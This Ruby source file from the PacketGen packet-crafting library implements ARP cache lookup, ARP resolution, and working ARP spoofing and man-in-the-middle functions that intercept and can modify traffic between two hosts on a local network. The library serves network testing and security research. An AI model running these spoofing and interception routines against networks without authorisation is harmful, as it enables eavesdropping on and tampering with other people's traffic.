# frozen_string_literal: true

# This file is part of PacketGen
# See https://github.com/sdaubert/packetgen for more informations
# Copyright (C) 2016 Sylvain Daubert <sylvain.daubert@laposte.net>
# This program is published under MIT license.

require_relative 'config'
require_relative 'utils/arp_spoofer'

module PacketGen
  # Collection of some network utilities.
  #
  # This module is not enabled by default. You need to:
  #  require 'packetgen/utils'
  # @author Sylvain Daubert
  # @since 2.1.3
  module Utils
    # @private
    MITM_FILTER = '((ip src %<target1> and not ip dst %<local_ip>) or' \
                  ' (ip src %<target2> and not ip dst %<local_ip>) or' \
                  ' (ip dst %<target1> and not ip src %<local_ip>) or' \
                  ' (ip dst %<target2> and not ip src %<local_ip>))' \
                  ' and ether dst %<local_mac>'

    # Get local ARP cache
    # @return [Hash] key: IP address, value: array containing MAC address and
    #    interface name
    def self.arp_cache
      raw_cache = `/usr/sbin/arp -an`

      cache = {}
      raw_cache.split("\n").each do |line|
        match = line.match(/\((\d+\.\d+\.\d+\.\d+)\) at (([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2})(?: \[ether\])? on (\w+)/)
        cache[match[1]] = [match[2], match[4]] if match
      end

      cache
    end

    # rubocop:disable Metrics/CyclomaticComplexity, Metrics/AbcSize

    # Get MAC address from an IP address, or nil if this IP address is unknown
    # on local network.
    # @param [String] ipaddr dotted-octet IP address
    # @param [Hash] options
    # @option options [String] :iface interface name. Default to
    #   {PacketGen.default_iface}
    # @option options [Boolean] :no_cache if +true+, do not query local ARP
    #   cache and always send an ARP request on wire. Default to +false+
    # @option options [Integer] :timeout timeout in seconds before stopping
    #   request. Default to 2.
    # @return [String,nil]
    # @raise [RuntimeError] user don't have permission to capture packets on network device.
    def self.arp(ipaddr, options={})
      unless options[:no_cache]
        local_cache = self.arp_cache
        return local_cache[ipaddr].first if local_cache.key?(ipaddr)
      end

      iface = options[:iface] || PacketGen.default_iface
      timeout = options[:timeout] || 1
      my_hwaddr = Config.instance.hwaddr(iface)
      arp_pkt = Packet.gen('Eth', dst: 'ff:ff:ff:ff:ff:ff', src: my_hwaddr)
                      .add('ARP', sha: Config.instance.hwaddr(iface),
                                  spa: Config.instance.ipaddr(iface),
                                  tpa: ipaddr)

      capture = Capture.new(iface: iface, timeout: timeout, max: 1,
                            filter: "arp src #{ipaddr} and ether dst #{my_hwaddr}")
      cap_thread = Thread.new { capture.start }

      arp_pkt.to_w(iface)
      cap_thread.join

      return if capture.packets.empty?

      capture.packets.each do |pkt|
        break pkt.arp.sha.to_s if pkt.arp.spa.to_s == ipaddr
      end
    end
    # rubocop:enable Metrics/AbcSize

    # Do ARP spoofing on given IP address. Call to this method blocks.
    # @note This method is provided for test purpose.
    # For more control, see {ARPSpoofer} class.
    # @param [String] target_ip target IP address
    # @param [String] spoofed_ip IP address to spoof
    # @param [Hash] options
    # @option options [String] :mac MAC address used to poison target
    #   ARP cache. Default to local MAC address.
    # @option options [Integer,nil] :for_seconds number of seconds to do ARP spoofing.
    #   If not defined, spoof forever.
    # @option options [Float,Integer] :interval number of seconds between 2
    #   ARP packets (default: 1.0).
    # @option options [String] :iface interface to use. Default to
    #   {PacketGen.default_iface}
    # @return [void]
    # @raise [RuntimeError] user don't have permission to capture packets on network device.
    def self.arp_spoof(target_ip, spoofed_ip, options={})
      interval = options[:interval] || 1.0
      as = ARPSpoofer.new(timeout: options[:for_seconds], interval: interval,
                          iface: options[:iface])
      as.start(target_ip, spoofed_ip, mac: options[:mac])
      as.wait
    end

    # rubocop:disable Metrics/AbcSize

    # Man in the middle attack. Capture all packets between two peers on
    # same local network.
    # @note This method is provided for test purpose.
    # @param [String] target1 IP address of first peer to attack
    # @param [String] target2 IP address of second peer to attack
    # @param [Hash] options
    # @option options [Float,Integer] :interval number of seconds between 2
    #   ARP packets (default: 1.0).
    # @option options [String] :iface interface to use. Default to
    #   {PacketGen.default_iface}
    # @return [void]
    # @yieldparam [Packet] pkt captured packets between target1 and target2
    # @yieldreturn [Packet] packet to send to target1 or 2. This may be
    #   modified received packet
    # @example Change ID in packets
    #   PacketGen::Utils.mitm('192.168.0.1', '192.168.0.45') do |pkt|
    #     if pkt.ip.src == '192.168.0.1'
    #       # 192.168.0.1 -> 192.168.0.45
    #       pkt.ip.id = 1
    #     else
    #       # 192.168.0.45 -> 192.168.0.1
    #       pkt.ip.id = 2
    #     end
    #     pkt
    #   end
    # @since 2.2.0
    # @raise [RuntimeError] user don't have permission to capture packets on network device.
    def self.mitm(target1, target2, options={})
      options = { iface: PacketGen.default_iface }.merge(options)

      mac1 = arp(target1)
      mac2 = arp(target2)

      spoofer = Utils::ARPSpoofer.new(options)
      spoofer.add target1, target2, options
      spoofer.add target2, target1, options

      cfg = Config.instance
      capture = Capture.new(iface: options[:iface],
                            filter: MITM_FILTER % { target1: target1, target2: target2, local_ip: cfg.ipaddr(options[:iface]), local_mac: cfg.hwaddr(options[:iface]) })

      spoofer.start_all
      capture.start do |pkt|
        modified_pkt = yield pkt
        iph = modified_pkt.ip
        l2 = modified_pkt.is?('Dot11') ? modified_pkt.dot11 : modified_pkt.eth

        if (iph.src == target1) || (iph.dst == target2)
          l2.dst = mac2
        elsif (iph.src == target2) || (iph.dst == target1)
          l2.dst = mac1
        else
          next
        end
        modified_pkt.to_w(options[:iface])
      end
    end
    # rubocop:enable Metrics/CyclomaticComplexity, Metrics/AbcSize
  end
end
